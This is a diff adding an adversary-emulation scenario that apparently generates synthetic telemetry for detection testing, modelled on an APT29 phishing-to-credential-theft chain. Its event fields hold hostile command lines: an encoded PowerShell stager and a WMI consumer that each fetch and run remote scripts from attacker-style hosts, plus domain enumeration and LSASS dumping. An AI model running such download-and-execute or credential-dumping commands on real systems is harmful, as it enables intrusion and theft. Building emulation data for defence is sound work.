@@ -1,0 +1,168 @@
+scenario_id: PF-APT29-01
+name: APT29 Spearphishing to Domain Credential Theft
+description: >
+  Emulates an APT29-style intrusion chain: a macro-bearing document spawns a
+  living-off-the-land downloader, the operator establishes WMI persistence,
+  escalates via token theft, then dumps LSASS and exfiltrates over HTTPS to a
+  look-alike CDN domain. Chosen because it exercises seven tactics with
+  techniques that are individually plausible-looking, so weak analytics that
+  rely on single-indicator matching will miss most of it.
+threat_actor: APT29 (Cozy Bear / Midnight Blizzard)
+references:
+  - https://attack.mitre.org/groups/G0016/
+
+steps:
+  - step_id: initial-access
+    technique_id: T1566.001
+    technique_name: Spearphishing Attachment
+    tactic: initial-access
+    description: Weaponised .docm delivered to a finance user; macro executes on open.
+    delay_seconds: 45
+    telemetry:
+      - source: email_gateway
+        event_type: email_delivered
+        host: "{host}"
+        user: "{user}"
+        email.sender: "procurement@vendor-invoices-eu.com"
+        email.subject: "Q3 Vendor Reconciliation - ACTION REQUIRED"
+        email.attachment_name: "Reconciliation_Q3_FINAL.docm"
+        email.attachment_sha256: "3f9a1c0e7b2d4a8f6e5c1b9d0a7f3e2c8b4d6a1f9e0c3b7d5a2f8e1c4b6d9a0f"
+        email.spf_result: "softfail"
+      - source: sysmon
+        event_type: process_creation
+        host: "{host}"
+        user: "{user}"
+        process.name: "WINWORD.EXE"
+        process.command_line: 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE /n "C:\Users\{user}\Downloads\Reconciliation_Q3_FINAL.docm"'
+        process.parent_name: "outlook.exe"
+        process.integrity_level: "Medium"
+
+  - step_id: execution
+    technique_id: T1059.001
+    technique_name: PowerShell
+    tactic: execution
+    description: Macro launches an encoded, hidden PowerShell stager from Word.
+    delay_seconds: 20
+    telemetry:
+      - source: sysmon
+        event_type: process_creation
+        host: "{host}"
+        user: "{user}"
+        process.name: "powershell.exe"
+        process.command_line: "powershell.exe -NoP -sta -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHQAZQBsAGUAbQBlAHQAcgB5AC0AcwB5AG4AYwAuAG4AZQB0AC8AYQAuAHAAcwAxACcAKQA="
+        process.parent_name: "WINWORD.EXE"
+        process.integrity_level: "Medium"
+      - source: sysmon
+        event_type: network_connection
+        host: "{host}"
+        user: "{user}"
+        process.name: "powershell.exe"
+        destination.ip: "{c2_ip}"
+        destination.port: 443
+        destination.domain: "{c2_domain}"
+        network.bytes_out: 2048
+
+  - step_id: persistence
+    technique_id: T1546.003
+    technique_name: WMI Event Subscription
+    tactic: persistence
+    description: Permanent WMI event consumer re-launches the implant at logon.
+    delay_seconds: 60
+    telemetry:
+      - source: sysmon
+        event_type: wmi_event
+        host: "{host}"
+        user: "{user}"
+        wmi.operation: "CommandLineEventConsumerCreated"
+        wmi.consumer_name: "WindowsTelemetrySync"
+        wmi.filter_query: "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+        process.command_line: 'powershell.exe -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(''https://{c2_domain}/b.ps1'')"'
+        process.name: "wmiprvse.exe"
+
+  - step_id: discovery
+    technique_id: T1087.002
+    technique_name: Domain Account Discovery
+    tactic: discovery
+    description: Operator enumerates domain admins and domain controllers.
+    delay_seconds: 25
+    telemetry:
+      - source: sysmon
+        event_type: process_creation
+        host: "{host}"
+        user: "{user}"
+        process.name: "net.exe"
+        process.command_line: 'net group "Domain Admins" /domain'
+        process.parent_name: "powershell.exe"
+        process.integrity_level: "Medium"
+      - source: sysmon
+        event_type: process_creation
+        host: "{host}"
+        user: "{user}"
+        process.name: "nltest.exe"
+        process.command_line: "nltest /dclist:{domain}"
+        process.parent_name: "powershell.exe"
+        process.integrity_level: "Medium"
+
+  - step_id: privilege-escalation
+    technique_id: T1134.001
+    technique_name: Token Impersonation/Theft
+    tactic: privilege-escalation
+    description: Implant duplicates a SYSTEM token from a service process.
+    delay_seconds: 40
+    telemetry:
+      - source: sysmon
+        event_type: process_access
+        host: "{host}"
+        user: "{user}"
+        process.name: "powershell.exe"
+        process.target_name: "winlogon.exe"
+        process.granted_access: "0x1478"
+        process.call_trace: "UNKNOWN(00007FFB9C2E1A40)|ntdll.dll+9d2e4|KERNELBASE.dll+2c1de"
+      - source: windows_security
+        event_type: privilege_use
+        host: "{host}"
+        user: "{user}"
+        winlog.event_id: 4703
+        winlog.privileges: "SeDebugPrivilege"
+
+  - step_id: credential-access
+    technique_id: T1003.001
+    technique_name: LSASS Memory
+    tactic: credential-access
+    description: Credential dump from LSASS via a renamed procdump binary.
+    delay_seconds: 35
+    telemetry:
+      - source: sysmon
+        event_type: process_access
+        host: "{host}"
+        user: "SYSTEM"
+        process.name: "svchost64.exe"
+        process.target_name: "lsass.exe"
+        process.granted_access: "0x1FFFFF"
+        process.call_trace: "C:\\Windows\\SYSTEM32\\ntdll.dll+9d2e4|C:\\Windows\\System32\\KERNELBASE.dll+2c1de"
+      - source: sysmon
+        event_type: file_create
+        host: "{host}"
+        user: "SYSTEM"
+        file.path: 'C:\Windows\Temp\lsass_dump.bin'
+        file.size: 48234496
+        process.name: "svchost64.exe"
+
+  - step_id: exfiltration
+    technique_id: T1041
+    technique_name: Exfiltration Over C2 Channel
+    tactic: exfiltration
+    description: Compressed credential material posted to the C2 over TLS.
+    delay_seconds: 30
+    telemetry:
+      - source: zeek
+        event_type: network_connection
+        host: "{host}"
+        user: "SYSTEM"
+        process.name: "svchost64.exe"
+        destination.ip: "{c2_ip}"
+        destination.port: 443
+        destination.domain: "{c2_domain}"
+        network.bytes_out: 18874368
+        network.protocol: "tls"
+        tls.ja3: "e7d705a3286e19ea42f587b344ee6865"
